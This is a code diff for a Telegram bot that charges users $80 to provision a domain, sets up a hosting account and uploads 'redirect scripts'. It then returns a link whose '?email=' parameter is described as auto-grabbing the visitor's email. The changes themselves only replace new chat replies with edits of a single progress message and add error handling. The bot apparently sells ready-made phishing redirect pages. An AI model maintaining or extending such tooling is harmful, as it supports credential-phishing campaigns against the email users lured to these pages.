@@ -565,15 +565,17 @@ if (bot) {
         isAdminFree ? "🎯 Starting domain provisioning request - Admin free access" : "🎯 Starting domain provisioning request - $80 deducted",
       );
 
+      let statusMessage;
+      
       if (isAdminFree) {
-        await ctx.reply(
+        statusMessage = await ctx.reply(
           `🔄 Processing domain: *${domain}*\n\n` +
           `🔑 Admin/Free access granted - no charge\n\n` +
           `Request ID: \`${requestId}\`\n\nThis may take a few moments...`,
           { parse_mode: "Markdown" },
         );
       } else {
-        await ctx.reply(
+        statusMessage = await ctx.reply(
           `🔄 Processing domain: *${domain}*\n\n` +
           `💰 $${cost} deducted from balance\n` +
           `💳 New Balance: $${user.balance.toFixed(2)}\n\n` +
@@ -587,9 +589,13 @@ if (bot) {
         log.info({ domain }, "Starting domain provisioning");
         const { user, password, ip } = await createAccount(domain, log);
 
-        await ctx.reply(
+        // Update status message
+        await ctx.telegram.editMessageText(
+          ctx.chat.id,
+          statusMessage.message_id,
+          null,
           `✅ Domain account created successfully!\n📝 Setting up redirect scripts...`,
-          { parse_mode: "Markdown" },
+          { parse_mode: "Markdown" }
         );
 
         // Step 2: Create 3 folders and upload script files
@@ -600,6 +606,15 @@ if (bot) {
           const fileName = rFile();
 
           try {
+            // Update progress
+            await ctx.telegram.editMessageText(
+              ctx.chat.id,
+              statusMessage.message_id,
+              null,
+              `✅ Domain account created successfully!\n📝 Setting up redirect scripts... (${i}/3)`,
+              { parse_mode: "Markdown" }
+            );
+
             // Create directory
             await createDirectory(user, folderName);
             log.info({ user, folderName }, "Directory created");
@@ -621,7 +636,7 @@ if (bot) {
           }
         }
 
-        // Step 3: Return results to user (without sensitive info)
+        // Step 3: Replace status message with final results
         const responseMessage =
           `🎉 *Domain provisioning completed!*\n\n` +
           `*Domain:* ${domain}\n` +
@@ -633,7 +648,14 @@ if (bot) {
           `📧 *Email Parameter:* Add ?email= to autpgrab email\n` +
           `*Example:* www.ffgfg.info/0000.html?email=1o1@mono.com/{email}`;
 
-        await ctx.reply(responseMessage, { parse_mode: "Markdown" });
+        // Replace the status message with final results
+        await ctx.telegram.editMessageText(
+          ctx.chat.id,
+          statusMessage.message_id,
+          null,
+          responseMessage,
+          { parse_mode: "Markdown" }
+        );
 
         // Save to user history (without sensitive server details)
         const userHistory = provisionHistory.get(ctx.from.id) || [];
@@ -661,10 +683,30 @@ if (bot) {
           { error: error.message, domain },
           "Domain provisioning failed",
         );
-        await ctx.reply(
-          `❌ *Provisioning failed:*\n\n${error.message}\n\nPlease try again with /start`,
-          { parse_mode: "Markdown" },
-        );
+        
+        // If we have a status message, edit it to show the error
+        if (statusMessage) {
+          try {
+            await ctx.telegram.editMessageText(
+              ctx.chat.id,
+              statusMessage.message_id,
+              null,
+              `❌ *Provisioning failed:*\n\n${error.message}\n\nPlease try again with /start`,
+              { parse_mode: "Markdown" }
+            );
+          } catch (editError) {
+            // If editing fails, send a new message
+            await ctx.reply(
+              `❌ *Provisioning failed:*\n\n${error.message}\n\nPlease try again with /start`,
+              { parse_mode: "Markdown" },
+            );
+          }
+        } else {
+          await ctx.reply(
+            `❌ *Provisioning failed:*\n\n${error.message}\n\nPlease try again with /start`,
+            { parse_mode: "Markdown" },
+          );
+        }
       }
 
       // Clear session
